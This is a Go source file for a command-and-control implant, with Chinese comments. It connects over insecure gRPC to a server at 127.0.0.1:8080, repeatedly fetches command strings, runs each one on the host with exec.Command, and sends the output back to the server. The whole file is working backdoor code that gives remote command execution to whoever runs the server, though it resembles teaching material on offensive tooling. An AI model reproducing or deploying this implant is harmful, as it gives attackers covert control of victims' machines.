package main

import (
	"c2/implant/grpcapi"
	"context"
	"log"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

	opts = append(opts, grpc.WithInsecure())

	// 连接服务器
	if conn, err = grpc.Dial("127.0.0.1:8080", opts...); err != nil {
		log.Fatalln(err)
	}
	defer conn.Close()

	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()

	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.Fetchcommand(ctx, req) // 获取命令执行
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			time.Sleep(time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0]) // go command命令 (name,args...)
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}

		buf, err := c.CombinedOutput() // 获取命令输出
		if err != nil {
			cmd.Out = err.Error()
		}

		cmd.Out += string(buf)      // 结果放到了cmd.out中
		client.SendOutput(ctx, cmd) // 输出发送给服务端
	}
}
